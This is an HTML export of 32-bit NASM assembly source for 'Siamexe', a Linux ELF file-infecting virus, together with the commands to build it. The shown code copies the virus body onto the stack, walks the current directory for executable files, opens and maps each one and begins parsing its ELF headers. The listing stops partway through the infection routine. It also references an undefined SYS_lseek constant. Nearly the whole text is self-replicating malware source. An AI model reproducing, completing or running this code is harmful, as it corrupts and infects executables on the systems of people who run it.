<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/1999/REC-html401-19991224/strict.dtd">
<html>
<head>
<META http-equiv=Content-Type content="text/html; charset=windows-1252">
<title>Exported from Notepad++</title>
<style type="text/css">
span {
	font-family: 'Courier New';
	font-size: 10pt;
	color: #000000;
}
.sc0 {
}
.sc1 {
	color: #008000;
}
.sc2 {
	color: #FF8000;
}
.sc3 {
	color: #808080;
}
.sc4 {
	font-weight: bold;
	color: #000080;
}
.sc5 {
}
.sc6 {
	font-weight: bold;
	color: #0000FF;
}
.sc8 {
	font-weight: bold;
	color: #8080FF;
}
.sc9 {
	color: #0080FF;
}
.sc10 {
	font-weight: bold;
	color: #000080;
}
.sc12 {
	color: #808000;
}
</style>
</head>
<body>
<div style="float: left; white-space: pre; line-height: 1; background: #FFFFFF; "><span class="sc0">
</span><span class="sc1">;  _____                  ______       ___   ___</span><span class="sc0">
</span><span class="sc1">; /     \_  ______ __ __ /     /~|_ ___\_ \ /  /___</span><span class="sc0">
</span><span class="sc1">; |  _  /_]/  __  \  '  V  ___/  _/  __  \ '  /    \
; |  __/  |   ____/  |  |___  \  |   ____/   /  --  \
; |__| |__|\______/__|__|_____/__|\_____/\__/\______/</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; This an example of an elf binary infection</span><span class="sc0">
</span><span class="sc1">; This technique is inspired of winux virus of Benny (great work)</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; to Assemble it:</span><span class="sc0">
</span><span class="sc1">;   nasm -f elf Siamexe.asm</span><span class="sc0">
</span><span class="sc1">;   ld -o Siamexe Siamexe.o</span><span class="sc0">


</span><span class="sc9">bits</span><span class="sc0"> </span><span class="sc2">32</span><span class="sc0">
</span><span class="sc9">global</span><span class="sc0"> </span><span class="sc5">_start</span><span class="sc0">

</span><span class="sc9">section</span><span class="sc0"> </span><span class="sc10">.text</span><span class="sc0">

    </span><span class="sc9">%define</span><span class="sc0"> </span><span class="sc5">SYS_exit</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
    </span><span class="sc9">%define</span><span class="sc0"> </span><span class="sc5">SYS_read</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0">
    </span><span class="sc9">%define</span><span class="sc0"> </span><span class="sc5">SYS_write</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">
    </span><span class="sc9">%define</span><span class="sc0"> </span><span class="sc5">SYS_open</span><span class="sc0"> </span><span class="sc2">5</span><span class="sc0">
    </span><span class="sc9">%define</span><span class="sc0"> </span><span class="sc5">SYS_close</span><span class="sc0"> </span><span class="sc2">6</span><span class="sc0">
    </span><span class="sc9">%define</span><span class="sc0"> </span><span class="sc5">SYS_execve</span><span class="sc0"> </span><span class="sc2">11</span><span class="sc0">
    </span><span class="sc9">%define</span><span class="sc0"> </span><span class="sc5">SYS_seek</span><span class="sc0"> </span><span class="sc2">19</span><span class="sc0">
    </span><span class="sc9">%define</span><span class="sc0"> </span><span class="sc5">SYS_brk</span><span class="sc0"> </span><span class="sc2">45</span><span class="sc0">
    </span><span class="sc9">%define</span><span class="sc0"> </span><span class="sc5">SYS_sethostname</span><span class="sc0"> </span><span class="sc2">74</span><span class="sc0">
    </span><span class="sc9">%define</span><span class="sc0"> </span><span class="sc5">SYS_readdir</span><span class="sc0"> </span><span class="sc2">89</span><span class="sc0">
    </span><span class="sc9">%define</span><span class="sc0"> </span><span class="sc5">SYS_mmap</span><span class="sc0"> </span><span class="sc2">90</span><span class="sc0">
    </span><span class="sc9">%define</span><span class="sc0"> </span><span class="sc5">SYS_munmap</span><span class="sc0"> </span><span class="sc2">91</span><span class="sc0">
    </span><span class="sc9">%define</span><span class="sc0"> </span><span class="sc5">SYS_lstat</span><span class="sc0"> </span><span class="sc2">107</span><span class="sc0">
    </span><span class="sc9">%define</span><span class="sc0"> </span><span class="sc5">SYS_uname</span><span class="sc0"> </span><span class="sc2">109</span><span class="sc0">
    </span><span class="sc9">%define</span><span class="sc0"> </span><span class="sc5">SYS_deprotect</span><span class="sc0"> </span><span class="sc2">125</span><span class="sc0">
    </span><span class="sc9">%define</span><span class="sc0"> </span><span class="sc5">SYS_get_kernel_syms</span><span class="sc0"> </span><span class="sc2">130</span><span class="sc0">

</span><span class="sc1">;-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú;</span><span class="sc0">
</span><span class="sc1">; Some CODEZZ...                               ;</span><span class="sc0">
</span><span class="sc1">;-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú;</span><span class="sc0">
</span><span class="sc5">_start</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">pushad</span><span class="sc0">                      </span><span class="sc1">; Restore all flags</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">32</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; get argv[0]</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">delta</span><span class="sc0">
    </span><span class="sc5">delta</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">

    </span><span class="sc1">; copy the virus body in the stack and exectute it</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">end_of_host</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">begin_host</span><span class="sc0">
    </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">-</span><span class="sc5">delta</span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">begin_host</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc0">
    </span><span class="sc6">rep</span><span class="sc0"> </span><span class="sc6">movsb</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc0">

      </span><span class="sc5">begin_host</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">-</span><span class="sc5">delta</span><span class="sc4">+</span><span class="sc5">_start</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0FFFFF000h</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3000h</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">7</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">SYS_deprotect</span><span class="sc0">
    </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">80h</span><span class="sc0">

    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">    </span><span class="sc1">; in mode 0</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">SYS_open</span><span class="sc0">   </span><span class="sc1">; open host file</span><span class="sc0">
    </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">80h</span><span class="sc0">

    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">0xFFFFF000</span><span class="sc0">
    </span><span class="sc6">ja</span><span class="sc0">  </span><span class="sc5">fuck_</span><span class="sc0">

    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">dot</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'.'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc5">dot</span><span class="sc4">:</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">

    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">InfectDirectory</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">

      </span><span class="sc5">RestoreHostCode</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">                            </span><span class="sc1">; edx=0 seekset</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">0b9h</span><span class="sc0">                                </span><span class="sc1">; mov ecx, xxxxxxxx</span><span class="sc0">
    </span><span class="sc5">bytes2seek</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">00000000h</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">SYS_lseek</span><span class="sc0">
    </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">80h</span><span class="sc0">

    </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">c_rc</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">-</span><span class="sc5">delta</span><span class="sc4">+</span><span class="sc5">first_generation</span><span class="sc4">]</span><span class="sc0">

      </span><span class="sc5">c_rc</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">-</span><span class="sc5">delta</span><span class="sc4">+</span><span class="sc5">_start</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">heap_end</span><span class="sc4">-</span><span class="sc5">_start</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">SYS_read</span><span class="sc0">
    </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">80h</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">SYS_close</span><span class="sc0">
    </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">80h</span><span class="sc0">

    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">end_of_host</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">begin_host</span><span class="sc0">   </span><span class="sc1">; free virus memory</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">32</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">     </span><span class="sc1">; write entrypoint</span><span class="sc0">
    </span><span class="sc6">popad</span><span class="sc0">                               </span><span class="sc1">; Restore all registers</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">                 </span><span class="sc1">; return to host</span><span class="sc0">

      </span><span class="sc5">fuck_</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">SYS_exit</span><span class="sc0">
    </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">80h</span><span class="sc0">
</span><span class="sc1">;-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú;</span><span class="sc0">
</span><span class="sc1">; NAME   * InfectDirectory                                                 ;</span><span class="sc0">
</span><span class="sc1">; DESCR  * infect ze current directory                                     ;</span><span class="sc0">
</span><span class="sc1">;        *                                                                 ;</span><span class="sc0">
</span><span class="sc1">;-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú;</span><span class="sc0">
</span><span class="sc1">; INPUT  * ESI = Directory to infect                                       ;</span><span class="sc0">
</span><span class="sc1">; OUTPUT *                                                                 ;</span><span class="sc0">
</span><span class="sc1">;-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú;</span><span class="sc0">
</span><span class="sc5">InfectDirectory</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">SYS_open</span><span class="sc0"> </span><span class="sc1">; open dir</span><span class="sc0">
    </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">80h</span><span class="sc0">

    </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc10">near</span><span class="sc0"> </span><span class="sc5">fuck_infect</span><span class="sc0">

    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">-</span><span class="sc5">delta</span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">DirStream</span><span class="sc4">]</span><span class="sc0">

      </span><span class="sc5">loop_z</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">-</span><span class="sc5">delta</span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">dirent</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">-</span><span class="sc5">delta</span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">DirStream</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">SYS_readdir</span><span class="sc0">
    </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">80h</span><span class="sc0">

    </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">fuck_infect</span><span class="sc0">

    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0ah</span><span class="sc0">                            </span><span class="sc1">; name of the file</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">

    </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">                            </span><span class="sc1">; name of ze file</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">-</span><span class="sc5">delta</span><span class="sc4">+</span><span class="sc5">stat</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">SYS_lstat</span><span class="sc0">
    </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">80h</span><span class="sc0">

    </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">fuck_infect</span><span class="sc0">                         </span><span class="sc1">; error ? fuck..</span><span class="sc0">

    </span><span class="sc6">movzx</span><span class="sc0">   </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ecx</span><span class="sc4">+</span><span class="sc2">08h</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">; get st_mode of ze file</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">

    </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0000F000h</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">00008000h</span><span class="sc0">          </span><span class="sc1">; is it a regular file?</span><span class="sc0">
    </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">get_nxt</span><span class="sc0">                             </span><span class="sc1">; if not find nxt</span><span class="sc0">

    </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">00000040h</span><span class="sc0">
    </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                            </span><span class="sc1">; is it a user executable file ?</span><span class="sc0">
    </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">get_nxt</span><span class="sc0">                             </span><span class="sc1">; if not find nxt</span><span class="sc0">
      </span><span class="sc5">gotcha</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">InfectFile</span><span class="sc0">                          </span><span class="sc1">; infect it!!</span><span class="sc0">
      </span><span class="sc5">get_nxt</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">loop_z</span><span class="sc0">
      </span><span class="sc5">fuck_infect</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">;-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú;</span><span class="sc0">
</span><span class="sc1">; NAME   * InfectFile                                                      ;</span><span class="sc0">
</span><span class="sc1">; DESCR  * infect an elf file                                              ;</span><span class="sc0">
</span><span class="sc1">;        *                                                                 ;</span><span class="sc0">
</span><span class="sc1">;-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú;</span><span class="sc0">
</span><span class="sc1">; INPUT  * ESI = Name of ze file                                           ;</span><span class="sc0">
</span><span class="sc1">; OUTPUT *                                                                 ;</span><span class="sc0">
</span><span class="sc1">;-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú;</span><span class="sc0">
</span><span class="sc5">InfectFile</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">cdq</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">                           </span><span class="sc1">; open ze file</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">                         </span><span class="sc1">; in rw mode</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">SYS_open</span><span class="sc0">
    </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">80h</span><span class="sc0">

    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">0xFFFFF000</span><span class="sc0">
    </span><span class="sc6">ja</span><span class="sc0">  </span><span class="sc10">near</span><span class="sc0"> </span><span class="sc5">open_fail</span><span class="sc0">

    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">-</span><span class="sc5">delta</span><span class="sc4">+</span><span class="sc5">FileHandle</span><span class="sc4">]</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">                              </span><span class="sc1">; SEEK to ze end = 2</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">                             </span><span class="sc1">; offset 0</span><span class="sc0">
    </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">                            </span><span class="sc1">;file handle</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">SYS_lseek</span><span class="sc0">
    </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">80h</span><span class="sc0">

    </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">                            </span><span class="sc1">; sizeof file</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">-</span><span class="sc5">delta</span><span class="sc4">+</span><span class="sc5">bytes2seek</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">-</span><span class="sc5">delta</span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">FileHandle</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">MapFile</span><span class="sc0">

    </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc10">near</span><span class="sc0"> </span><span class="sc5">mmap_fail</span><span class="sc0">
    </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">-</span><span class="sc5">delta</span><span class="sc4">+</span><span class="sc5">MapAdress</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">

    </span><span class="sc1">;begin infection</span><span class="sc0">
      </span><span class="sc5">begin_infection</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc2">464C457Fh</span><span class="sc0">
    </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc10">near</span><span class="sc0"> </span><span class="sc5">unmap_spce</span><span class="sc0">         </span><span class="sc1">; shit ! not a valid elf</span><span class="sc0">

    </span><span class="sc6">movzx</span><span class="sc0">   </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">28h</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">; get elf header size</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">18h</span><span class="sc4">]</span><span class="sc0">        </span><span class="sc1">; get entry_point</span><span class="sc0">
    </span><span class="sc6">movzx</span><span class="sc0">   </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">2ch</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">; get ph number</span><span class="sc0">
    </span><span class="sc6">movzx</span><span class="sc0">   </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">2ah</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">; get ph entry size</span><span class="sc0">

    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">                                 </span><span class="sc1">; set edi to beginning of</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                            </span><span class="sc1">; program header table</span><span class="sc0">
      </span><span class="sc5">nxt_phdr</span><span class="sc4">:</span><span class="sc0">
